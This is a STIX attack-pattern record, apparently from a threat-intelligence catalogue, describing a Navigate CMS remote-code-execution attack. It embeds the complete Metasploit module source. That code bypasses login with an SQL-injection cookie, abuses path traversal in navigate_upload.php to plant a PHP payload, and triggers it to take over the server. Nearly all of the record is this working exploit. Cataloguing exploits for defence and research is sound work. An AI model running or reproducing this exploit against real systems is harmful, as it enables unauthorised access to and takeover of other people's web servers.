{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9c10bab7-dc4c-465b-9974-5f5b9f4f46f9",
    "created": "2024-08-14T17:09:12.078988Z",
    "modified": "2024-08-14T17:09:12.078992Z",
    "name": "Navigate CMS Unauthenticated Remote Code Execution",
    "description": "( This module exploits insufficient sanitization in the database::protect method, of Navigate CMS versions 2.8 and prior, to bypass authentication.  The module then uses a path traversal vulnerability in navigate_upload.php that allows authenticated users to upload PHP files to arbitrary locations. Together these vulnerabilities allow an unauthenticated attacker to execute arbitrary PHP code remotely.  This module was tested against Navigate CMS 2.8. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/navigate_cms_rce.rb",
            "external_id": "navigate_cms_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-17553#Fileupload"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Navigate CMS Unauthenticated Remote Code Execution',\n      'Description' => %q(\n        This module exploits insufficient sanitization in the database::protect\n        method, of Navigate CMS versions 2.8 and prior, to bypass authentication.\n\n        The module then uses a path traversal vulnerability in navigate_upload.php\n        that allows authenticated users to upload PHP files to arbitrary locations.\n        Together these vulnerabilities allow an unauthenticated attacker to\n        execute arbitrary PHP code remotely.\n\n        This module was tested against Navigate CMS 2.8.\n      ),\n      'Author' =>\n        [\n          'Pyriphlegethon' # Discovery / msf module\n        ],\n      'License' => MSF_LICENSE,\n      'References' =>\n        [\n          ['CVE', '2018-17552'], # Authentication bypass\n          ['CVE', '2018-17553']  # File upload\n        ],\n      'Privileged' => false,\n      'Platform' => ['php'],\n      'Arch' => ARCH_PHP,\n      'Targets' =>\n        [\n          ['Automatic', {}]\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2018-09-26'))\n\n    register_options [\n      OptString.new('TARGETURI', [true, 'Base Navigate CMS directory path', '/navigate/']),\n    ]\n\n    self.needs_cleanup = true\n  end\n\n  def login_bypass\n    check_resp = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/login.php')\n    )\n\n    login_bypass_resp = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/login.php'),\n      'cookie' => 'navigate-user=\\\" OR TRUE--%20'\n    )\n\n    if login_bypass_resp &&\n       login_bypass_resp.code == 302 &&\n       check_resp.body.include?('Navigate CMS')\n      session_id = login_bypass_resp.get_cookies_parsed\n                                    .values.select { |v| v.to_s.include?('NVSID_') }\n                                    .first.first\n      return session_id\n    end\n  end\n\n  def check\n    return CheckCode::Vulnerable if login_bypass\n    CheckCode::Safe\n  end\n\n  def exploit\n    session_id = login_bypass\n    fail_with(Failure::NoAccess, 'Login bypass failed') unless session_id\n\n    print_good('Login bypass successful')\n\n    php = payload.encoded\n    data = Rex::MIME::Message.new\n    data.add_part(php, 'image/jpeg', nil,\n      \"form-data; name=\\\"file\\\"; filename=\\\"#{rand_text_alphanumeric(10..15)}\\\"\")\n    data_post = data.to_s\n\n    upload = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/navigate_upload.php'),\n      'vars_get' => Hash[{\n        'session_id' => session_id,\n        'engine' => 'picnik',\n        'id' => '../../../navigate_info.php'\n      }.to_a.shuffle],\n      'ctype' => \"multipart/form-data; boundary=#{data.bound}\",\n      'data' => data_post\n    )\n\n    fail_with(Failure::Unreachable, 'Unable to reach target') unless upload\n    fail_with(Failure::Unknown, 'Upload unsuccessful') unless upload.code == 200\n\n    print_good('Upload successful')\n\n    print_status('Triggering payload...')\n    send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/navigate_info.php')\n    )\n  end\n\n  def on_new_session(session)\n    super\n    if session.type != 'meterpreter'\n      print_error('Unable to restore navigate_info.php')\n      return\n    end\n\n    session.core.use('stdapi') if !session.ext.aliases.include?('stdapi')\n\n    begin\n      session.fs.file.open('navigate_info.php', 'w').write(\"<?php\\n\\nphpinfo();\\n\\n?>\")\n    rescue\n      print_error('Unable to restore navigate_info.php')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-09-26",
    "x_mitre_platforms": [
        "['php']"
    ]
}